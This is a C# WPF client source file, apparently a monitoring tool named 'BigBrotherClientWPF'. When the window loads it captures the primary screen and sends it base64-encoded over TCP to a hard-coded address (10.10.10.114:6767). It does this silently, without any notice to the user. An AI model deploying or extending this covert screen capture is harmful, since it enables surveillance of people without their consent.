using System;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows;
using System.Windows.Forms;


namespace BigBrotherClientWPF
{
        public partial class MainWindow : Window
        {
            public MainWindow()
            {
                InitializeComponent();

            UdpClientDiscovery.Discover();

                Loaded += async (_, __) =>
                {
                    await SendPing();
                    await SendScreenshot();
                };
            }

            async Task SendPing()
            {
                try
                {
                    Debug.WriteLine("Pinguje cie");

                    using TcpClient client = new TcpClient();
                    await client.ConnectAsync("10.10.10.114", 6767);

                    var stream = client.GetStream();
                    var msg = Encoding.UTF8.GetBytes("PING");

                    await stream.WriteAsync(msg, 0, msg.Length);
                }
                catch (Exception e)
                {
                    Debug.WriteLine(e.ToString());
                }
            }

            async Task SendScreenshot()
            {
                try
                {
                    Debug.WriteLine("Robię screenshot (WPF)");

                    string base64 = CaptureScreenshotBase64();

                    using TcpClient client = new TcpClient();
                    await client.ConnectAsync("10.10.10.114", 6767);

                    var stream = client.GetStream();

                    string message = $"SCREENSHOT|{base64}";

                byte[] data = Encoding.UTF8.GetBytes(message);
                byte[] length = BitConverter.GetBytes(data.Length);

               

                   await stream.WriteAsync(length, 0, 4);
                    await stream.WriteAsync(data, 0, data.Length);
            }
                catch (Exception e)
                {
                    Debug.WriteLine(e.ToString());
                }
            }

        string CaptureScreenshotBase64()
        {
            var bounds = Screen.PrimaryScreen.Bounds;

            using Bitmap bmp = new Bitmap(bounds.Width, bounds.Height);
            using Graphics g = Graphics.FromImage(bmp);

            g.CopyFromScreen(0, 0, 0, 0, bounds.Size);

            using MemoryStream ms = new MemoryStream();
            bmp.Save(ms, ImageFormat.Png);

            return Convert.ToBase64String(ms.ToArray());
        }
    }
}